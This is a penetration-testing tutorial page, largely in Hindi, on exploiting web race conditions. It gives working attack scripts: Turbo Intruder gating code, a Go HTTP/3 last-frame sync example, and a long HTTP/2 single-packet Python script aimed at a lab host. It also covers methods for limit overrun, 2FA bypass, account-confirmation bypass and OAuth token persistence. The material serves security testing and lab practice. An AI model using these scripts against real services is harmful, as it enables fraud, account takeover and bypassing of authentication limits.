# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> इस तकनीक को गहराई से समझने के लिए मूल रिपोर्ट देखें [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Race Condition Attacks को बेहतर बनाना

race conditions का फायदा उठाने में मुख्य बाधा यह सुनिश्चित करना है कि कई requests एक ही समय पर संभाले जाएँ, और उनके processing times में बहुत कम अंतर हो—आदर्श रूप से, 1ms से कम।

यहाँ Requests को सिंक्रोनाइज़ करने के कुछ तरीके दिए गए हैं:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: एक single TCP connection पर दो requests भेजने का समर्थन करता है, जिससे network jitter का प्रभाव कम होता है। हालांकि, server-side विविधताओं के कारण, दो requests एक लगातार race condition exploit के लिए पर्याप्त नहीं हो सकते।
- **HTTP/1.1 'Last-Byte Sync'**: 20–30 requests के अधिकांश हिस्सों को पहले से भेजने की अनुमति देता है, एक छोटा सा fragment रोक कर रखा जाता है, जिसे फिर एक साथ भेजकर सर्वर पर समानांतर आगमन हासिल किया जाता है।

**Last-Byte Sync की तैयारी** में शामिल है:

1. headers और body data को अंतिम byte के बिना भेजना, और stream को समाप्त न करना।
2. प्रारंभिक भेजने के बाद 100ms के लिए रुकना।
3. अंतिम frames को बैच करने के लिए TCP_NODELAY को अक्षम करना ताकि Nagle's algorithm काम करे।
4. connection को warm up करने के लिए ping करना।

जो frames रोके गए हैं उन्हें बाद में भेजने पर वे एक single packet में पहुँचने चाहिए, जिसे Wireshark से सत्यापित किया जा सकता है। यह तरीका आमतौर पर static files पर लागू नहीं होता, जो सामान्यतः RC attacks में शामिल नहीं होते।

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3, QUIC (UDP) पर चलता है। यहाँ TCP coalescing या Nagle पर भरोसा नहीं किया जा सकता, इसलिए पारंपरिक last‑byte sync off‑the‑shelf clients के साथ काम नहीं करता। इसके बजाय, आपको जानबूझकर कई QUIC stream‑final DATA frames (FIN) को एक ही UDP datagram में coalesce करना होता है ताकि सर्वर सभी target requests को एक ही scheduling tick में प्रोसेस करे।
- **How to do it**: QUIC frame control एक्सपोज़ करने वाली purpose‑built लाइब्रेरी का उपयोग करें। उदाहरण के लिए, H3SpaceX quic-go को manipulate करके HTTP/3 last‑frame synchronization को requests-with-body और GET‑style requests दोनों के लिए लागू करता है।
- Requests‑with‑body: N streams के लिए HEADERS + DATA को अंतिम byte के बिना भेजें, फिर प्रत्येक stream का final byte एक साथ flush करें।
- GET‑style: नकली DATA frames बनाएं (या Content‑Length के साथ एक छोटा सा body) और सभी streams को एक ही datagram में end करें।
- **Practical limits**:
  - Concurrency सीमित होती है peer के QUIC max_streams transport parameter से (HTTP/2 के SETTINGS_MAX_CONCURRENT_STREAMS के समान). अगर यह कम है, तो कई H3 connections खोलें और race को उनके बीच फैलाएँ।
  - UDP datagram size और path MTU यह सीमित करते हैं कि आप कितने stream‑final frames को coalesce कर सकते हैं। लाइब्रेरी जरूरत पड़ने पर उन्हें multiple datagrams में विभाजित कर देती है, लेकिन single‑datagram flush सबसे अधिक विश्वसनीय होता है।
- **Practice**: सार्वजनिक H2/H3 race labs और H3SpaceX के साथ sample exploits उपलब्ध हैं।

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### सर्वर आर्किटेक्चर के अनुसार अनुकूलन

लक्ष्य की आर्किटेक्चर को समझना महत्वपूर्ण है। Front-end servers अनुरोधों को अलग तरीके से route कर सकते हैं, जिससे timing प्रभावित होती है। Preemptive server-side connection warming, अप्रासंगिक अनुरोधों के माध्यम से, अनुरोध की timing को समान कर सकता है।

#### सेशन-आधारित लॉकिंग को संभालना

Frameworks जैसे PHP's session handler session के आधार पर requests को serialize करते हैं, जो संभावित रूप से कमजोरियों को छुपा सकते हैं। प्रत्येक अनुरोध के लिए अलग session tokens का उपयोग इस समस्या को दरकिनार कर सकता है।

#### दर या संसाधन सीमाओं को पार करना

यदि connection warming प्रभावी नहीं है, तो dummy अनुरोधों की बाढ़ के जरिए web servers के rate या resource limit delays को जानबूझकर ट्रिगर करने से server-side delay उत्पन्न हो सकता है, जो race conditions के अनुकूल single-packet attack को सुविधाजनक बना सकता है।

## हमला के उदाहरण

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

यदि आप **विभिन्न मान भेजने वाले हैं**, तो आप कोड को इस तरह बदल सकते हैं जो clipboard से wordlist का उपयोग करता है:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> यदि वेब HTTP2 को सपोर्ट नहीं करता (केवल HTTP1.1), तो `Engine.THREADED` या `Engine.BURP` का उपयोग `Engine.BURP2` के बजाय करें।

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: यदि आपको 1 endpoint को एक request भेजनी है और फिर RCE ट्रिगर करने के लिए अन्य कई endpoints को multiple requests भेजनी हों, तो आप `race-single-packet-attack.py` स्क्रिप्ट को कुछ इस तरह बदल सकते हैं:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- यह **Repeater** में भी उपलब्ध है, Burp Suite के नए '**Send group in parallel**' विकल्प के माध्यम से।
- **limit-overrun** के लिए आप समूह में बस **same request 50 times** जोड़ सकते हैं।
- **connection warming** के लिए, आप वेब सर्वर के किसी non static हिस्से के लिए कुछ **requests** को समूह के **beginning** में **add** कर सकते हैं।
- दो उप-स्टेट्स वाले चरण में एक अनुरोध और दूसरे अनुरोध को प्रोसेस करने के **between** प्रक्रिया को **delaying** करने के लिए, आप दोनों अनुरोधों के बीच **add extra requests between** कर सकते हैं।
- एक **multi-endpoint** RC के मामले में आप वह **request** भेजना शुरू कर सकते हैं जो **goes to the hidden state**, और उसके तुरंत बाद उस छिपे हुए स्टेट को **exploits the hidden state** करने के लिए **50 requests** भेजें।

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: इस script का उद्देश्य एक user का email बदलना है और लगातार उसकी सत्यापन स्थिति की जाँच करते रहना है, जब तक कि नए email का verification token आख़िरी email पर न पहुँच जाए (कोड में ऐसा एक RC मिल रहा था जहाँ email बदलना संभव था पर verification पुराने email पर भेज दिया जाता था क्योंकि email दिखाने वाला variable पहले वाले से populated था).\
जब प्राप्त ईमेल में शब्द "objetivo" मिलता है तो हम जानते हैं कि हमने बदले हुए email का verification token प्राप्त कर लिया है और हम attack समाप्त कर देते हैं।
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: इंजन और गेटिंग नोट्स

- इंजन चयन: HTTP/2 लक्ष्यों पर `Engine.BURP2` का उपयोग करें ताकि single‑packet attack ट्रिगर हो; HTTP/1.1 last‑byte sync के लिए `Engine.THREADED` या `Engine.BURP` पर वापस जाएँ।
- `gate`/`openGate`: `gate='race1'` (या per‑attempt gates) के साथ कई प्रतियाँ कतार में डालें, जो प्रत्येक request की tail को होल्ड करता है; `openGate('race1')` सभी tails को एक साथ फ्लश करता है ताकि वे लगभग एक साथ पहुँचें।
- Diagnostics: Turbo Intruder में negative timestamps बताती हैं कि server ने response किया request पूरी तरह भेजे जाने से पहले, जिससे overlap साबित होता है। यह true races में अपेक्षित है।
- Connection warming: timings स्थिर करने के लिए पहले एक ping या कुछ harmless requests भेजें; वैकल्पिक रूप से final frames के बैचिंग को प्रोत्साहित करने हेतु `TCP_NODELAY` disable करें।

### Improving Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

ध्यान दें कि भले ही यह सुधार उन RC की विश्वसनीयता बढ़ाता है जिनके लिए सैकड़ों/हजारों packets एक साथ पहुँचने चाहिए, यह कुछ सॉफ़्टवेयर सीमाओं से भी बंध सकता है। कुछ लोकप्रिय HTTP servers जैसे Apache, Nginx और Go में `SETTINGS_MAX_CONCURRENT_STREAMS` की सख्त setting 100, 128 और 250 है। हालांकि, NodeJS और nghttp2 में यह अनलिमिटेड है.\
इसका मूल अर्थ है कि Apache एक single TCP connection से केवल 100 HTTP connections ही मानेगा (जो इस RC attack को सीमित करता है)। HTTP/3 के लिए समकक्ष सीमा QUIC’s max_streams transport parameter है — अगर यह छोटा है, तो अपना race कई QUIC connections में फैलाएँ।

You can find some examples using this technique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** पिछले सेक्शन के उदाहरण देखें।
- **Intruder**: **request** को **Intruder** में भेजें, **Options menu** में **number of threads** को **30** सेट करें, payload के रूप में **Null payloads** चुनें और **30** जनरेट करें।
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

This is the most basic type of race condition where **vulnerabilities** that **appear** in places that **limit the number of times you can perform an action**. Like using the same discount code in a web store several times. A very easy example can be found in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) or in [**this bug**](https://hackerone.com/reports/759247)**.**

There are many variations of this kind of attack, including:

- एक gift card को कई बार redeem करना
- एक product को कई बार rate करना
- अपने account balance से अधिक cash withdraw या transfer करना
- एक ही CAPTCHA solution का पुन: उपयोग करना
- anti-brute-force rate limit को bypass करना

### **Hidden substates**

Complex race conditions का exploit अक्सर छोटे समय के अवसरों का फायदा उठाने से होता है, जहाँ hidden या **unintended machine substates** के साथ interact किया जा सके। इसे कैसे अंजाम दें:

1. **Identify Potential Hidden Substates**
- उन endpoints की पहचान करें जो critical डेटा modify या interact करते हैं, जैसे user profiles या password reset processes। ध्यान दें:
- **Storage**: ऐसे endpoints को प्राथमिकता दें जो server-side persistent data manipulate करते हैं, न कि जो client-side डेटा संभालते हैं।
- **Action**: उन operations को देखें जो existing data बदलते हैं — ये नई entry डालने वाली operations की तुलना में exploit करने के लिए अधिक संभावनाएँ पैदा करते हैं।
- **Keying**: सफल हमले सामान्यतः एक ही identifier पर keyed operations पर निर्भर करते हैं, जैसे username या reset token।
2. **Conduct Initial Probing**
- पहचान किए गए endpoints पर race condition परीक्षण चलाएँ और expected outcomes से किसी भी deviation को observe करें। अप्रत्याशित responses या application व्यवहार में बदलाव vulnerability का संकेत हो सकते हैं।
3. **Demonstrate the Vulnerability**
- हमले को exploit करने के लिए आवश्यक minimal number of requests तक संकुचित करें, अक्सर सिर्फ दो। सही timing की ज़रूरत के कारण यह चरण कई कोशिशें या automation मांग सकता है।

### Time Sensitive Attacks

सटीक timing वाले requests vulnerabilities को उजागर कर सकते हैं, खासकर तब जब security tokens के लिए predictable methods जैसे timestamps का उपयोग किया जाता हो। उदाहरण के लिए, timestamps पर आधारित password reset tokens एक साथ किए गए requests के लिए identical tokens बनाने की अनुमति दे सकते हैं।

**To Exploit:**

- सटीक timing का उपयोग करें, जैसे single packet attack, ताकि concurrent password reset requests भेजें। identical tokens vulnerability का संकेत हैं।

**Example:**

- एक ही समय पर दो password reset tokens request करें और उनकी तुलना करें। अगर tokens मिलते हैं तो यह token generation में flaw का संकेत है।

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.

### Confirm other emails

आईडिया यह है कि एक ही समय में किसी email address को **verify** करें और उसे किसी दूसरे email में बदल दें ताकि पता चल सके कि प्लेटफ़ॉर्म नए email को verify करता है या नहीं।

### Change email to 2 emails addresses Cookie based

According to [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab was vulnerable to a takeover this way because it might **send** the **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

If **2 different writes** are used to **add** **information** inside a **database**, there is a small portion of time where **only the first data has been written** inside the database. For example, when creating a user the **username** and **password** might be **written** and **then the token** to confirm the newly created account is written. This means that for a small time the **token to confirm an account is null**.

Therefore **registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) to confirm the account right away could allow to c**onfirm an account** where you don't control the email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). ये सेवाएँ आपको एक application बनाने और उन उपयोगकर्ताओं को authenticate करने की अनुमति देती हैं जिन्हें provider ने रजिस्टर किया है। ऐसा करने के लिए, **client** को **permit your application** करने की जरूरत होगी ताकि वह **OAUth provider** के अंदर उनके कुछ डेटा को access कर सके।\
तो, अब तक यह सामान्य login जैसा ही है google/linkedin/github... के साथ जहाँ आपको एक पेज दिखाया जाता है जिस पर लिखा होता है: "_Application <InsertCoolName> wants to access your information, do you want to allow it?_"

#### Race Condition in `authorization_code`

**समस्या** तब उत्पन्न होती है जब आप **इसे स्वीकार करते हैं** और यह स्वचालित रूप से एक **`authorization_code`** malicious application को भेज देता है। फिर यह **application OAUth service provider में एक Race Condition का दुरुपयोग करके आपके खाते के लिए `authorization_code` से एक से अधिक AT/RT** (_Authentication Token/Refresh Token_) उत्पन्न कर देता है। मूल रूप से, यह इस तथ्य का दुरुपयोग करेगा कि आपने application को अपने डेटा तक पहुँच की अनुमति दे दी है ताकि वह **कई खाते बना सके**। फिर, यदि आप **application को अपने डेटा तक पहुँच देना बंद कर देते हैं तो एक जोड़ी AT/RT हटा दी जाएगी, लेकिन अन्य जो अभी भी मान्य रहेंगे**।

#### Race Condition in `Refresh Token`

एक बार जब आपने **वैध RT प्राप्त कर लिया** है, तो आप इसे **दुरुपयोग करके कई AT/RT जनरेट करने** की कोशिश कर सकते हैं और **यहाँ तक कि अगर उपयोगकर्ता दुष्ट application के लिए permissions रद्द कर दे**, तब भी **कई RTs अभी भी मान्य रहेंगे।**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
